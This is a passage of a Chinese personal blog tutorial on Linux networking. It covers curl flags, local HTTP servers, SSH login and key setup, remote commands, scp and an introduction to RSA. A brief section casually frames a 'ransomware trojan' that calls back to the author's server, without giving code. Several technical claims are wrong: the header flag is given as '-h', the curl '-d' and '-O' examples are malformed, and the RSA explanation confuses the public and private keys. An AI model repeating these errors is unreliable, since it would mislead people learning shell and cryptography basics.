<h4 id="配置请求头"><a href="#配置请求头" class="headerlink" title="配置请求头"></a><strong>配置请求头</strong></h4><p><code>-h</code>或者<code>--header</code>当然是请求头啦</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -H <span class="token string">"Content-Type: application/json"</span> -H <span class="token string">"Accept: */*"</span> -X POST -d
<span class="token punctuation">{</span><span class="token string">"name"</span><span class="token builtin class-name">:</span><span class="token string">"zhangsan"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>有意思的是，写成键值对是添加请求头；<br>但如果只写一个键，那么代表移除这个请求头</p>
<h4 id="配置参数"><a href="#配置参数" class="headerlink" title="配置参数"></a><strong>配置参数</strong></h4><p>一般是输出到一个文件内</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -o res.html http://www.baidu.com/s?wd<span class="token operator">=</span><span class="token number">1024</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>-o</code>就是<code>output</code>代表输出位置<br>大写的<code>-O</code>则是直接把文件写入到当前目录下同名的文件中</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -O res.html http://www.baidu.com/index.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>还有<code>-s</code>安静模式不显示报错和进度，<code>-#</code>显示进度条，以及上传文件和断点重传等操作，不过这些就留给大家自行学习了</p>
<h4 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h4><p>除了<code>curl</code>,我们还有<code>wget</code>等命令，但是它们本质上是一样的，所以此处不再做详细介绍</p>
<h4 id="勒索木马实战"><a href="#勒索木马实战" class="headerlink" title="勒索木马实战"></a>勒索木马实战</h4><p>如果有网络请求了，那么我们就可以在服务器上运行自己的代码，然后潜入的木马运行时向该服务器发起请求——这样里应外合就能达到一些更加绝妙的效果：</p>
<p>我在服务器上部署了一个Node服务器，写了一个简单的加密算法：</p>
<blockquote>
<p><strong>加密前</strong><br>泗水亭长笑尽万般随意，却是半生酒气金戈铁骑<br><strong>加密后</strong><br>洗簵仭��筑氾乇鈭雏焐ｌ捵景捋畟ꅓ汔ꇒ扈꓂髑</p>
</blockquote>
<h4 id="开启本地服务器"><a href="#开启本地服务器" class="headerlink" title="开启本地服务器"></a>开启本地服务器</h4><p>严格来说，这个部分和shell或者linux关系不大，因为这里主要是依赖于第三方工具的</p>
<p>但是还是把它们单独列出来，目的是为了提醒我自己——别忘了命令行有多么强大：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python -m http.server <span class="token number">8000</span>
npx http-server -p <span class="token number">8001</span>
php -S localhost:8002
systemctl start apache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>输出结果（如果系统已经提前配置好了环境的话）</p>
<blockquote>
<p>Serving HTTP on :: port 8000 (http://[::]:8000/) …<br>…<br>(略)</p>
</blockquote>
<p>没错！这样就开启了本地服务器（路径是终端当前所处的目录下），真是太棒了对吧</p>
<h3 id="ssh协议"><a href="#ssh协议" class="headerlink" title="ssh协议"></a>ssh协议</h3><p>这一部分本想放到网络请求章节内，但奈何要素过多，内容异常丰富，所以单独提炼作为一章</p>
<h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>我们又迎来了一位重量级选手，它就是<code>ssh</code>——不过那是什么？</p>
<blockquote>
<p><code>ssh</code>，即<code>Secure Shell</code>，专为远程登录会话和其他网络服务提供安全的协议</p>
<p>相较于传统(比如FTP)明文传输的方式，建立在应用层的SSH通过对网络数据进行加密和验证，使得数据传输更安全</p>
</blockquote>
<h4 id="登录远程服务器"><a href="#登录远程服务器" class="headerlink" title="登录远程服务器"></a>登录远程服务器</h4><p>带上服务器的公网IP，还有你的服务器用户名，马上就要启程了:</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ssh</span> <span class="token punctuation">[</span>username<span class="token punctuation">]</span>@<span class="token punctuation">[</span>ip<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果一切顺利，那么我的勇士，你将看到这样一段话：</p>
<blockquote>
<p>The authenticity of host ‘xxx.xxx.xxx.xxx (yyy.yyy.yyy.yyy)’ can’t be established.<br>ECDSA key fingerprint is SHA256:zzzzzzzzzzzzz<br>Are you sure you want to continue connecting (yes/no/[fingerprint])?</p>
</blockquote>
<p>当然是选择<code>yes</code>啊——此时，该服务器的信息将被存入你主机<code>ssh</code>文件夹下的<code>known_hosts</code>文件中，下次访问就不会再出现这段文字了</p>
<p>然后就是紧张刺激的输入密码环节了，linux下的密码输入过程都是不会显示输入内容的：</p>
<blockquote>
<p>[username]@[ip]’s password:(这是一段看不见的密码)</p>
</blockquote>
<p>如果登录成功，你将会看到:</p>
<blockquote>
<p>[[username]@[systemName] ~]#</p>
</blockquote>
<p>注意了，这里可是<code>#</code>——也就是至高无上的root用户！<br>一般用户则是用<code>$</code>表示的</p>
<p>另外，要断开连接的话，使用<code>ctrl+d</code>即可</p>
<h4 id="配置别名"><a href="#配置别名" class="headerlink" title="配置别名"></a>配置别名</h4><p>哎呀，服务器IP好难记哦，所以我们在<strong>本地</strong>的<code>~/.ssh/config</code>配置一下</p>
<blockquote>
<p>啥？你没有这个文件？那直接touch一个就好了</p>
</blockquote>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Host DeepDream
	HostName xxx.xxx.xxx.xxx
	User yyy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>之后，再让我们连接一次服务器:</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ssh</span> DeepDream<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>简单多了吧~</p>
<h4 id="密码学基础"><a href="#密码学基础" class="headerlink" title="密码学基础"></a>密码学基础</h4><p>先来点基础概念：</p>
<blockquote>
<p><strong>密钥</strong><br>也有写作<strong>秘钥</strong>的，反正意思就是<strong>秘密的钥匙</strong>，怎么写好像都有道理；更无语的是，钥可以读作“月”，所以读作“蜜月”也是正确的….</p>
<p><strong>私钥</strong><br>没有公开的秘钥</p>
<p><strong>公钥</strong><br>公开的秘钥</p>
</blockquote>
<p>估计大家都知道一些基础，那直接开快车上高速了——<strong>双钥密码体系</strong>，解决了<strong>单钥密码体系</strong>中安全信道建立成本太高的问题</p>
<blockquote>
<p>安全信道的作用是<strong>抗窃听</strong>，并且保证<strong>交互两方身份可信</strong></p>
</blockquote>
<p>双钥密码体制中常见的一种加密算法就是<strong>RSA算法</strong>：</p>
<blockquote>
<p><strong>加密: secStr = oriStr ^ E % N</strong></p>
<p>secStr表示密文，oriStr表示原文, E和N是两个较大的常数,<br>其中<strong>E将作为秘钥，此处用于加密(encode)</strong></p>
<p><strong>解密: oriStr = secStr ^ D % N</strong><br>这里的N和加密时使用的是同一个值，而<strong>D将作为公钥，此处用于解密(decode)</strong></p>
<p>通常，我们把这样的秘钥、公钥完整的表达为**(E，N)<strong>和</strong>(D，N)<strong>，密钥对则写作</strong>(E，D，N)**</p>
<p>这里通常使E和D的值非常大，以便于对N取模板能得到相同的结果（这样一手操作，除了穷举法之外，我个人是想不到任何破解方法了——但是这里也说了，值非常大，这样使破解所需的算力开销非常大）</p>
</blockquote>
<p>那么问题来了，我们加密的时候怎么去确定E和D的值，总不能也是穷举吧？计算方式大致如下:</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> <span class="token constant">N</span> <span class="token operator">=</span> 大质数p <span class="token operator">*</span> 大质数q<span class="token punctuation">;</span>
<span class="token keyword">let</span> <span class="token constant">L</span> <span class="token operator">=</span> <span class="token function">lcmFunc</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// lcmFunc 求最小公倍数</span>
<span class="token keyword">let</span> <span class="token constant">E</span> <span class="token operator">=</span> <span class="token operator">?</span> <span class="token comment">// 秘钥，1&lt;E&lt;L</span>
<span class="token function">gcdFunc</span><span class="token punctuation">(</span><span class="token constant">E</span><span class="token punctuation">,</span> <span class="token constant">L</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// gcdFunc求最大公约数</span>
<span class="token keyword">let</span> <span class="token constant">D</span> <span class="token operator">=</span> <span class="token operator">?</span> <span class="token comment">// 公钥</span>
<span class="token constant">E</span> <span class="token operator">*</span> <span class="token constant">D</span> <span class="token operator">%</span> <span class="token constant">L</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>另外，双钥密码体系，可以根据需求选择两种套路:</p>
<blockquote>
<p><strong>套路一：加密秘钥保密，解密秘钥公开</strong><br>主要目的是保障信息的 <strong>可鉴别性（知道是谁发的）</strong>、 <strong>完整性（防止被篡改）</strong>、<strong>抗抵赖性（别说不是你发的）</strong>，优点是提供了抗抵赖的证据，有效识别身份. 应用场景式, 官方发布消息, 大众访问消息.</p>
<p><strong>套路二：加密秘钥公开，解密秘钥保密</strong><br>主要是为了保障信息的 <strong>机密性（只有我知道写的什么）</strong>,优点是能大幅降低对安全信道的依赖. 机密信息传输.</p>
</blockquote>
<p>基于套路一，我们进一步聊聊<strong>签名</strong></p>
<blockquote>
<p><strong>物理签名</strong><br>基于物理载体不可伪造，也可以理解为一种“<strong>加密秘钥保密</strong>”</p>
<p><strong>数字签名</strong><br>基于数据内容不可伪造，比如经过<strong>CA用自己的私钥签名过的 张三的公钥信息</strong>——没错这玩意儿就是<strong>CA证书</strong>，之后李四要是拿着<strong>CA的公钥能解密开张三的CA证书</strong>，那么就视为张三这个身份是可信的（当然这建立在CA是足够权威的基础上——野鸡CA就算了吧…）</p>
</blockquote>
<h4 id="秘钥配置免登录"><a href="#秘钥配置免登录" class="headerlink" title="秘钥配置免登录"></a>秘钥配置免登录</h4><p>经过之前的一波分析，我们这里就该将<strong>解密秘钥作为公钥，加密秘钥作为私钥</strong>（这不是废话吗，你是数据的发送者，你拿解密的秘钥干嘛…）</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ssh-keygen <span class="token comment"># 生成秘钥对</span>
<span class="token comment"># 之后的任何操作都可以直接enter跳过</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>然后去<code>~/.ssh</code>找找看，私钥<code>id_rsa</code>和公钥<code>id_rsa.pub</code>在等着你！</p>
<p>先想想看，登录密码这种设定是为了干嘛——认证身份对吧，也就是起到秘钥的作用。</p>
<p>那么我们给服务器配置一下我们的解密公钥，就可以达到验证身份的效果了~具体操作流程如下：</p>
<blockquote>
<p>复制<code>id_rsa.pub</code>，然后前往<code>~/.ssh/authorized_keys</code>（如果没有，那就直接创建），粘贴即可</p>
<p>没错，<strong>keys</strong> 就是指 <strong>秘钥</strong>。如果有多个秘钥，那么空格给开就行了。</p>
</blockquote>
<p>当然，有时候这个过程会因为疏忽大意而出错，所以这里还有一种简便的等效操作：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-copy-id <span class="token punctuation">[</span>ip<span class="token punctuation">]</span>
<span class="token comment"># 举个例子</span>
ssh-copy-id DeapDream<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>如果一切顺利，就能像我一样看到这句话：</p>
<blockquote>
<p>Now try logging into the machine, with:   “ssh ‘DeepDream’”<br>and check to make sure that only the key(s) you wanted were added.</p>
</blockquote>
<h4 id="远程执行命令"><a href="#远程执行命令" class="headerlink" title="远程执行命令"></a>远程执行命令</h4><p>快控制你的服务器执行一下之前学过的shell操作！</p>
<blockquote>
<p>抓不到肉鸡，就只能拿自己的服务器开刀，太下头了（）</p>
</blockquote>
<p>语法大概是这样的，具体操作就自行探索了：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ssh</span> <span class="token punctuation">[</span>username<span class="token punctuation">]</span>@<span class="token punctuation">[</span>ip<span class="token punctuation">]</span> <span class="token punctuation">[</span>command<span class="token punctuation">]</span>
<span class="token comment"># 举个例子:</span>
<span class="token function">ssh</span> DeapDream <span class="token builtin class-name">echo</span> <span class="token string">"hello world"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>这里可能就有读者会问了——这个和登录之后再执行命令有什么区别？</p>
<p>其实没啥区别，只是这里没有和服务器保持连接（相当于你登录服务器执行了命令又退出来了）</p>
<h4 id="scp文件传输"><a href="#scp文件传输" class="headerlink" title="scp文件传输"></a>scp文件传输</h4><blockquote>
<p><code>scp</code>即<code>secure copy</code>，基于ssh进行远程文件拷贝</p>
</blockquote>
<p>基本用法：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">scp</span> <span class="token punctuation">[</span>src<span class="token punctuation">]</span> <span class="token punctuation">[</span>target<span class="token punctuation">]</span> <span class="token comment"># 将文件复制到target</span>
<span class="token function">scp</span> <span class="token punctuation">[</span>src1<span class="token punctuation">]</span> <span class="token punctuation">[</span>src2<span class="token punctuation">]</span> <span class="token punctuation">[</span>target<span class="token punctuation">]</span> <span class="token comment"># 批量操作</span>
<span class="token function">scp</span> -r <span class="token punctuation">[</span>src<span class="token punctuation">]</span> <span class="token punctuation">[</span>target<span class="token punctuation">]</span> <span class="token comment"># 复制文件夹</span>
<span class="token comment"># 也可以反过来从服务器上下载内容到本机</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>实际示例：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">scp</span> 拼多多电商经验.md DeepDream:/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ssh连接服务器然后cd到根目录再ls一手，就可以看到我的电商副业经验之谈<br><font style="font-size: 22px;font-weight:900;">《从零基础入门到暴亏上万》</font></p>
<h3 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h3><h3 id="获得帮助"><a href="#获得帮助" class="headerlink" title="获得帮助"></a>获得帮助</h3><p>Linux命令很多，而且还有不同的实现版本，我们很难记住所有指令，所以我们可以像这样得到帮助</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">man</span> 命令 <span class="token comment"># 查看某个命令的用法;（但是我的bash不支持这个命令）</span>
<span class="token function">apropos</span> 字符串 <span class="token comment"># 通过搜索某个关键词来找到可能相关的命令</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>




















                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">Serio</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://coderserio.github.io/2023/02/20/linux/">https://coderserio.github.io/2023/02/20/linux/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">Serio</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">
                                    <span class="chip bg-color">操作系统</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    
    <div class="livere-card card" data-aos="fade-up">
    <!-- 来必力City版安装代码 -->
    <div id="lv-container" class="card-content" data-id="city" data-uid="MTAyMC81NDg1OC8zMTMyNw==">
        <script type="text/javascript">
            (function (d, s) {
                let j, e = d.getElementsByTagName(s)[0];
                if (typeof LivereTower === 'function') {
                    return;
                }

                j = d.createElement(s);
                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
                j.async = true;

                e.parentNode.insertBefore(j, e);
            })(document, 'script');
        </script>
        <noscript>为正常使用来必力评论功能请激活JavaScript。</noscript>
    </div>
    <!-- City版安装代码已完成 -->
</div>
    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2023/02/20/mysql/">
                    <div class="card-image">
                        
                        <img src="/medias/postimages/7.jpg" class="responsive-img" alt="MySQL">
                        
                        <span class="card-title">MySQL</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            前端也得懂一点数据库才是
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-02-20
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" class="post-category">
                                    数据库
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">
                        <span class="chip bg-color">数据库</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2023/02/20/miniprogram/">
                    <div class="card-image">
                        
                        <img src="/medias/postimages/26.jpg" class="responsive-img" alt="小程序开发">
                        
                        <span class="card-title">小程序开发</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            更小，更高效！
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-02-20
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E5%B0%8F%E7%A8%8B%E5%BA%8F/" class="post-category">
                                    小程序
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/">
                        <span class="chip bg-color">小程序</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>





    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('1'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="song"
                   id="1322877419"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2023</span>
            
            <a href="/about" target="_blank">Serio</a>
            |&nbsp;Powered by&nbsp;<a href="#" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="#" target="_blank">Matery</a>
            <br>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/CoderSerio" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:2779066456@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>





    <a href="https://twitter.com/Eg4HTb5i41JUERI" class="tooltipped" target="_blank" data-tooltip="关注我的Twitter: https://twitter.com/Eg4HTb5i41JUERI" data-position="top" data-delay="50">
        <i class="fab fa-twitter"></i>
    </a>



    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2779066456" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2779066456" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>





    <a href="https://www.zhihu.com/people/serio-41" class="tooltipped" target="_blank" data-tooltip="关注我的知乎: https://www.zhihu.com/people/serio-41" data-position="top" data-delay="50">
        <i class="fab fa-zhihu1">知</i>
    </a>



    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
